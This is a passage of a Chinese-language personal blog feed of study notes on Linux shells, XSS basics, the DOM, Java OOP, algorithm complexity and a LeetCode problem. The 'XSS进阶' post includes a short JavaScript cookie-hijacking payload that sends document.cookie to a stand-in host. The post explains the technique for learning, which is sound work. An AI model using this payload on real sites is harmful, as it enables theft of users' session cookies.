    <content type="html"><![CDATA[<h1 id="父子shell"><a href="#父子shell" class="headerlink" title="父子shell"></a>父子shell</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>当我们在bash中输入几次bash时并没有什么反应，查看ps。可以看到每一个bash进程的PPID都是上一个bash的PID。这可以看出他们的父子关系。</p><h2 id="分号的作用"><a href="#分号的作用" class="headerlink" title="分号的作用"></a>分号的作用</h2><p>分号的作用就是依次执行命令。</p><h2 id="sleep和jobs"><a href="#sleep和jobs" class="headerlink" title="sleep和jobs"></a>sleep和jobs</h2><h2 id="后台用法"><a href="#后台用法" class="headerlink" title="后台用法"></a>后台用法</h2><h2 id="coproc协程"><a href="#coproc协程" class="headerlink" title="coproc协程"></a>coproc协程</h2><h2 id="外部命令和内建命令"><a href="#外部命令和内建命令" class="headerlink" title="外部命令和内建命令"></a>外部命令和内建命令</h2><p>外部命令：需要另外创建进程。</p><p>内建命令： 不需要另外创建进程。</p><p>另外我们可以通过<code>tpye</code> 命令来显示指定命令的类型。</p><h2 id="alias别名"><a href="#alias别名" class="headerlink" title="alias别名"></a>alias别名</h2><p>该命令作用是定义或显示别名。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;父子shell&quot;&gt;&lt;a href=&quot;#父子shell&quot; class=&quot;headerlink&quot; title=&quot;父子shell&quot;&gt;&lt;/a&gt;父子shell&lt;/h1&gt;&lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概</summary>
      
    
    
    
    <category term="Linux" scheme="http://jacen-cpu.github.io/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>XSS进阶</title>
    <link href="http://jacen-cpu.github.io/2021/04/06/XSS%E8%BF%9B%E9%98%B6/"/>
    <id>http://jacen-cpu.github.io/2021/04/06/XSS%E8%BF%9B%E9%98%B6/</id>
    <published>2021-04-06T09:16:39.000Z</published>
    <updated>2021-05-28T13:42:16.534Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS-Payload"><a href="#XSS-Payload" class="headerlink" title="XSS Payload"></a>XSS Payload</h1><p>XSS Payload是指用以完成各种具体功能的脚本(主要Javascript)。</p><p>例如Cookie劫持：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.CreateElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">img.src = <span class="string">&quot;http://www.XSS.com/log?&quot;</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XSS-Payload&quot;&gt;&lt;a href=&quot;#XSS-Payload&quot; class=&quot;headerlink&quot; title=&quot;XSS Payload&quot;&gt;&lt;/a&gt;XSS Payload&lt;/h1&gt;&lt;p&gt;XSS Payload是指用以完成各种具体功能的脚本(主要Javas</summary>
      
    
    
    
    <category term="web" scheme="http://jacen-cpu.github.io/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>什么是DOM?</title>
    <link href="http://jacen-cpu.github.io/2021/04/03/%E4%BB%80%E4%B9%88%E6%98%AFDOM/"/>
    <id>http://jacen-cpu.github.io/2021/04/03/%E4%BB%80%E4%B9%88%E6%98%AFDOM/</id>
    <published>2021-04-03T07:43:35.000Z</published>
    <updated>2021-04-03T12:26:29.887Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是DOM"><a href="#什么是DOM" class="headerlink" title="什么是DOM"></a>什么是DOM</h1><blockquote><p><strong>文档对象模型 (DOM) 是HTML和XML文档的编程接口</strong>。它提供了对文档的结构化的表述，并定义了一种方式可以使从程序中对该结构进行访问，从而改变文档的结构，样式和内容。DOM 将文档解析为一个由节点和对象（包含属性和方法的对象）组成的结构集合。<em>简言之，它会将web页面和脚本或程序语言连接起来</em>。</p></blockquote><p>总之文档对象模型是对文档的另一种表现形式。一个文档可以在浏览器窗口或作为HTML源码显示出来，而DOM是文档存储和操作的方式。例如，W3C DOM 中指定下面代码中的<code>getElementsByTagName</code>方法必须要返回所有<code>&lt;P&gt;</code> 元素的列表：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">paragraphs = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;P&quot;</span>);</span><br><span class="line"><span class="comment">// paragraphs[0] is the first &lt;p&gt; element</span></span><br><span class="line"><span class="comment">// paragraphs[1] is the second &lt;p&gt; element, etc.</span></span><br><span class="line">alert(paragraphs[<span class="number">0</span>].nodeName);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是DOM&quot;&gt;&lt;a href=&quot;#什么是DOM&quot; class=&quot;headerlink&quot; title=&quot;什么是DOM&quot;&gt;&lt;/a&gt;什么是DOM&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;文档对象模型 (DOM) 是HTML和XML文档的编程接口&lt;/st</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>XSS简介</title>
    <link href="http://jacen-cpu.github.io/2021/04/03/XSS%E7%AE%80%E4%BB%8B/"/>
    <id>http://jacen-cpu.github.io/2021/04/03/XSS%E7%AE%80%E4%BB%8B/</id>
    <published>2021-04-03T02:55:15.000Z</published>
    <updated>2021-05-28T13:21:57.806Z</updated>
    
    <content type="html"><![CDATA[<p>XSS英文全称(Cross Site Script),为了和CSS进行区别，在安全领域叫做”XSS”。XSS根据效果的不同分成三类:反射型，储存型，DOM Based XSS。</p><h1 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h1><p>它只是简单地把用户输入的数据反射给服务器。实现方式是黑客诱导用户点击恶意链接。</p><h1 id="储存型XSS"><a href="#储存型XSS" class="headerlink" title="储存型XSS"></a>储存型XSS</h1><p>它把用户输入的数据储存在服务器，这种方法具有很强的稳定性。</p><h1 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM Based XSS"></a>DOM Based XSS</h1><p>从效果上来说，这也是反射型的XSS。其实现方法是修改页面的DOM节点。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;XSS英文全称(Cross Site Script),为了和CSS进行区别，在安全领域叫做”XSS”。XSS根据效果的不同分成三类:反射型，储存型，DOM Based XSS。&lt;/p&gt;
&lt;h1 id=&quot;反射型XSS&quot;&gt;&lt;a href=&quot;#反射型XSS&quot; class=&quot;hea</summary>
      
    
    
    
    <category term="web" scheme="http://jacen-cpu.github.io/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>排序</title>
    <link href="http://jacen-cpu.github.io/2021/04/03/%E6%8E%92%E5%BA%8F/"/>
    <id>http://jacen-cpu.github.io/2021/04/03/%E6%8E%92%E5%BA%8F/</id>
    <published>2021-04-03T01:21:52.000Z</published>
    <updated>2021-04-03T01:21:52.631Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>OOP多态</title>
    <link href="http://jacen-cpu.github.io/2021/04/03/OOP%E5%A4%9A%E6%80%81/"/>
    <id>http://jacen-cpu.github.io/2021/04/03/OOP%E5%A4%9A%E6%80%81/</id>
    <published>2021-04-02T23:02:00.000Z</published>
    <updated>2021-04-02T23:37:12.217Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OOP多态"><a href="#OOP多态" class="headerlink" title="OOP多态"></a>OOP多态</h1><h2 id="“is-a”规则（置换规则）"><a href="#“is-a”规则（置换规则）" class="headerlink" title="“is-a”规则（置换规则）"></a>“is-a”规则（置换规则）</h2><p>我们举个例子吧。如果我们有一个类叫做动物。显然我们可以创建一个动物的对象。接着我们考虑动物是一个超类，它有一个子类叫做“狗”。逻辑上来讲狗是动物，但是动物不一定是狗。因此我们可以进行这样的操作：将狗的对象赋值给动物类的变量。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Anmial dogs = <span class="keyword">new</span> Dogs();</span><br></pre></td></tr></table></figure><p>因此在JAVA程序设计中对象变量是多态的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;OOP多态&quot;&gt;&lt;a href=&quot;#OOP多态&quot; class=&quot;headerlink&quot; title=&quot;OOP多态&quot;&gt;&lt;/a&gt;OOP多态&lt;/h1&gt;&lt;h2 id=&quot;“is-a”规则（置换规则）&quot;&gt;&lt;a href=&quot;#“is-a”规则（置换规则）&quot; class=&quot;head</summary>
      
    
    
    
    <category term="JAVA" scheme="http://jacen-cpu.github.io/categories/JAVA/"/>
    
    
  </entry>
  
  <entry>
    <title>删除排序数组中的重复项</title>
    <link href="http://jacen-cpu.github.io/2021/04/01/%E5%88%A0%E9%99%A4%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E9%87%8D%E5%A4%8D%E9%A1%B9/"/>
    <id>http://jacen-cpu.github.io/2021/04/01/%E5%88%A0%E9%99%A4%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E9%87%8D%E5%A4%8D%E9%A1%B9/</id>
    <published>2021-04-01T09:09:49.000Z</published>
    <updated>2021-04-01T09:46:37.571Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode是个什么东西"><a href="#leetcode是个什么东西" class="headerlink" title="leetcode是个什么东西"></a>leetcode是个什么东西</h1><p>给你一个有序数组 nums ，请你 原地 删除重复出现的元素，使每个元素 只出现一次 ，返回删除后数组的新长度。</p><p>不要使用额外的数组空间，你必须在 原地 修改输入数组 并在使用 O(1) 额外空间的条件下完成。</p><p>作者：力扣 (LeetCode)<br>链接：<a class="link"   href="https://leetcode-cn.com/leetbook/read/top-interview-questions-easy/x2gy9m/" >https://leetcode-cn.com/leetbook/read/top-interview-questions-easy/x2gy9m/<i class="fas fa-external-link-alt"></i></a><br>来源：力扣（LeetCode）<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">removeDuplicates</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = numsSize;</span><br><span class="line">    <span class="keyword">int</span> front = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[i] != nums[i + <span class="number">1</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> pace = i - front;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i; j &lt; len; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                nums[j - pace] = nums[j];</span><br><span class="line">            &#125;</span><br><span class="line">            len -= pace;</span><br><span class="line">            i -= pace;</span><br><span class="line">            front = i + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i + <span class="number">1</span> == len - <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            len -= (i - front + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>花了我整整两个小时我生疏的解决了leetcode算法的第一题。我心态崩了。</p><p>先来看看我的算法吧。我们</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;leetcode是个什么东西&quot;&gt;&lt;a href=&quot;#leetcode是个什么东西&quot; class=&quot;headerlink&quot; title=&quot;leetcode是个什么东西&quot;&gt;&lt;/a&gt;leetcode是个什么东西&lt;/h1&gt;&lt;p&gt;给你一个有序数组 nums ，请你 原地 删</summary>
      
    
    
    
    <category term="leetcode WriteUp" scheme="http://jacen-cpu.github.io/categories/leetcode-WriteUp/"/>
    
    
  </entry>
  
  <entry>
    <title>算法的时空复杂度</title>
    <link href="http://jacen-cpu.github.io/2021/04/01/%E7%AE%97%E6%B3%95%E7%9A%84%E6%97%B6%E7%A9%BA%E5%A4%8D%E6%9D%82%E5%BA%A6/"/>
    <id>http://jacen-cpu.github.io/2021/04/01/%E7%AE%97%E6%B3%95%E7%9A%84%E6%97%B6%E7%A9%BA%E5%A4%8D%E6%9D%82%E5%BA%A6/</id>
    <published>2021-04-01T06:17:07.000Z</published>
    <updated>2021-05-21T10:54:05.798Z</updated>
    
    <content type="html"><![CDATA[<h1 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h1><h2 id="大O表示法"><a href="#大O表示法" class="headerlink" title="大O表示法"></a>大O表示法</h2><p>它用于描述算法的性能和复杂程度。大O表示法将算法按照消耗的时间进行分类，依据输入增大所需的空间和内存。</p><table><thead><tr><th align="center">符号</th><th align="center">名称</th></tr></thead><tbody><tr><td align="center">O(1)</td><td align="center">常数的</td></tr><tr><td align="center">O(log(n))</td><td align="center">对数的</td></tr><tr><td align="center">O((log(n)c)</td><td align="center">对数多项式的</td></tr><tr><td align="center">O(n)</td><td align="center">线性的</td></tr><tr><td align="center">O(n^2)</td><td align="center">二次的</td></tr><tr><td align="center">O(n^c)</td><td align="center">多项式的</td></tr><tr><td align="center">O(c^n)</td><td align="center">指数的</td></tr></tbody></table><p>如何理解。首先是如何衡量一个算法的效率。考虑用资源，CPU(时间)的占用，内存的占用，硬盘的占用，硬盘的占用和网络的占用。当我们考虑大O表示法时一般考虑的是CPU(时间)的占用。</p><h1 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h1><p>下面是两个将一维数组a中的n个数逆序存放到原数组中的算法。</p><p>算法1：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n/<span class="number">2</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    t = a[i];</span><br><span class="line">    a[i] = a[n - i - <span class="number">1</span>];</span><br><span class="line">    a[a - i - <span class="number">1</span>] = t;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>算法2：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line">    b[i] = a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = n<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">    a[n - i - <span class="number">1</span>] = b[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比较这两个算法，我们发现算法1仅仅借助了一个变量t与问题规模n大小无关空间复杂度为O(1)，而算法2另外借助了一个大小为n的辅助数组b，所以空间复杂度为O(n)。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;时间复杂度&quot;&gt;&lt;a href=&quot;#时间复杂度&quot; class=&quot;headerlink&quot; title=&quot;时间复杂度&quot;&gt;&lt;/a&gt;时间复杂度&lt;/h1&gt;&lt;h2 id=&quot;大O表示法&quot;&gt;&lt;a href=&quot;#大O表示法&quot; class=&quot;headerlink&quot; title=&quot;大O表</summary>
      
    
    
    
    <category term="数据结构" scheme="http://jacen-cpu.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>OOP继承</title>
    <link href="http://jacen-cpu.github.io/2021/03/31/OOP%E7%BB%A7%E6%89%BF/"/>
    <id>http://jacen-cpu.github.io/2021/03/31/OOP%E7%BB%A7%E6%89%BF/</id>
    <published>2021-03-31T00:06:21.000Z</published>
    <updated>2021-03-31T06:11:54.838Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OOP继承"><a href="#OOP继承" class="headerlink" title="OOP继承"></a>OOP继承</h1><p>简单来说继承就是一个抽象到具体，共性到特性，一般到特殊的过程。</p><h2 id="类，超类，子类"><a href="#类，超类，子类" class="headerlink" title="类，超类，子类"></a>类，超类，子类</h2><p>首先我们得了解类，超类，子类这三者的区别。一般被继承的类叫做超类，也叫做父类或是基类。而继承的类叫做子类，派生类或是孩子类。而类这是一个大的概念就不多做解释了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dogs</span> <span class="keyword">extends</span> <span class="title">animal</span> </span>&#123;</span><br><span class="line">    <span class="comment">//添加方法和域</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上述代码这就是定义子类的方法。</p><blockquote><p>在C++中继承的符号是<code> :</code></p></blockquote><h2 id="覆盖方法"><a href="#覆盖方法" class="headerlink" title="覆盖方法"></a>覆盖方法</h2><p>这也叫方法的重写。在IDEA中我们可以这样实现。</p><p>接着选择override，然后选择你需要重写的方法。</p><h2 id="子类构造器"><a href="#子类构造器" class="headerlink" title="子类构造器"></a>子类构造器</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Manager</span> <span class="params">(String name, <span class="keyword">double</span> salaty, <span class="keyword">int</span> year, <span class="keyword">int</span> month, <span class="keyword">int</span> day)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(name, salary, year, month, day);</span><br><span class="line">    bonus = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为子类Manager的构造器无法访问其父类的私有域，这里我们运用了<code>super</code>关键字调用了超类的构造器。并且使用super调用构造器的语句必须是子类构造器的第一条语句。这样子类终于可以实现真正的啃老了！！！</p><blockquote><p>总结：this有两个用途：1.引用隐式参数，2.调用该类的其他构造器。super有两个用途：1.调用超类的方法，2.调用超类的构造器。</p></blockquote><h2 id="多层继承"><a href="#多层继承" class="headerlink" title="多层继承"></a>多层继承</h2><p>这是一个比较有意思的功能。想一想，有父亲和儿子，难道就不能有孙子吗？因此这个继承是可以嵌套的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;&#125;;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dogs</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;&#125;;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LauLaduo</span> <span class="keyword">extends</span> <span class="title">Dogs</span> </span>&#123;&#125;;</span><br></pre></td></tr></table></figure><p>但是JAVA是不支持多继承的(C++支持)，但是你可以用嵌套。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;OOP继承&quot;&gt;&lt;a href=&quot;#OOP继承&quot; class=&quot;headerlink&quot; title=&quot;OOP继承&quot;&gt;&lt;/a&gt;OOP继承&lt;/h1&gt;&lt;p&gt;简单来说继承就是一个抽象到具体，共性到特性，一般到特殊的过程。&lt;/p&gt;
&lt;h2 id=&quot;类，超类，子类&quot;&gt;&lt;a hr</summary>
      
    
    
    
    <category term="JAVA" scheme="http://jacen-cpu.github.io/categories/JAVA/"/>
    
    
  </entry>
  
  <entry>
    <title>OOP封装</title>
    <link href="http://jacen-cpu.github.io/2021/03/30/OOP%E5%B0%81%E8%A3%85/"/>
    <id>http://jacen-cpu.github.io/2021/03/30/OOP%E5%B0%81%E8%A3%85/</id>
    <published>2021-03-30T05:04:57.000Z</published>
    <updated>2021-03-30T13:12:02.616Z</updated>
    
    <content type="html"><![CDATA[<h1 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(age &gt; <span class="number">100</span> || age &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.age = <span class="number">0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get和set这就是OOP封装。OOP封装有很大的优点，此时的age是一个只读域，很好的保护了数据的安全，虽然可以用set来修改他的值，但是我们可以在set里设置判断是否合法的条件。</p><h1 id="好用的工具"><a href="#好用的工具" class="headerlink" title="好用的工具"></a>好用的工具</h1><p>虽然OOP封装有很多优点，但是如果在开发过程中有很多需要封装的实例域，这就会极大地降低效率。在IDEA中我推荐使用lombok。</p><p>首先我们需要安装lombpk插件。</p><p>接着我们在maven库中下载我们所需的架包。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;封装&quot;&gt;&lt;a href=&quot;#封装&quot; class=&quot;headerlink&quot; title=&quot;封装&quot;&gt;&lt;/a&gt;封装&lt;/h1&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span c</summary>
      
    
    
    
    <category term="JAVA" scheme="http://jacen-cpu.github.io/categories/JAVA/"/>
    
    
  </entry>
  
  <entry>
    <title>JAVA中的static</title>
    <link href="http://jacen-cpu.github.io/2021/03/24/JAVA%E4%B8%AD%E7%9A%84static/"/>
    <id>http://jacen-cpu.github.io/2021/03/24/JAVA%E4%B8%AD%E7%9A%84static/</id>
    <published>2021-03-24T07:07:44.000Z</published>
    <updated>2021-03-30T00:28:18.596Z</updated>
    
    <content type="html"><![CDATA[<h1 id="静态域"><a href="#静态域" class="headerlink" title="静态域"></a>静态域</h1><p>如果将域定义为static,那么每个类只有这样一个域。例如我们需要给每个雇员给定一个唯一的标识符：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> nextId = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里给Employee类添加了一个实例域id和一个静态域<code>nextId</code>,这个静态域即使是没有对象存在，它也是存在的，<strong>因为它不属于如何对象，它属于类。</strong></p><h1 id="静态常量"><a href="#静态常量" class="headerlink" title="静态常量"></a>静态常量</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Math</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">double</span> PI = <span class="number">3.14159265358979323846</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上例子中PI就是一个静态常量,只有通过<code> Math.PI</code>才能访问。在举一个奇特例子，我们经常使用的<code>Sysem.out </code>的out其实也是静态常量。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">System</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> out = ...;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h1><p>静态方法是一种不能向对象实施操作的方法。它不能使用任何类的对象，换句话说没有隐式的参数。但是静态方法可以访问自类中的静态域。如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getNextId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> nextId;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以通过类名调用这个方法：</p><p><code>int n = Employee.getNextId();</code> </p><p>静态方法的使用主要出现在一下两种情况：</p><ol><li>一个方法不需要访问对象状态，所需的参数都是显示参数提供的。</li><li>一个方法只需访问类的静态域。</li></ol><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="private-static"><a href="#private-static" class="headerlink" title="private static"></a>private static</h2><p>我们先看一看<code>public static</code>，既然有了public，那么每个类的对象都可以对公有域的值经行修改。于是就到了我们所提到的<code>private static</code>,但是我们如何得到它的值呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String Plot = <span class="string">&quot;JOJO&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String getPlotInstance &#123;</span><br><span class="line">    <span class="keyword">return</span> Plot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以用一个get方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(Dogs.getPlotInstance);<span class="comment">//这里的Dogs是一个类名。</span></span><br></pre></td></tr></table></figure><h2 id="static单例模式"><a href="#static单例模式" class="headerlink" title="static单例模式"></a>static单例模式</h2><p>直接上代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Earth</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Earth instance = <span class="keyword">new</span> Earth();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> Earth &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Earth <span class="title">getIntance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码叼就叼在第二行的<code>private Earth</code>,这个private让你不能new。我们只能让你用<code>getInstance()</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Earth earthinstance = Earth.getIntance();</span><br></pre></td></tr></table></figure><p>所有你只能new唯一个例子，这种模式的高级叫法是：static单例模式。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;静态域&quot;&gt;&lt;a href=&quot;#静态域&quot; class=&quot;headerlink&quot; title=&quot;静态域&quot;&gt;&lt;/a&gt;静态域&lt;/h1&gt;&lt;p&gt;如果将域定义为static,那么每个类只有这样一个域。例如我们需要给每个雇员给定一个唯一的标识符：&lt;/p&gt;
&lt;figure clas</summary>
      
    
    
    
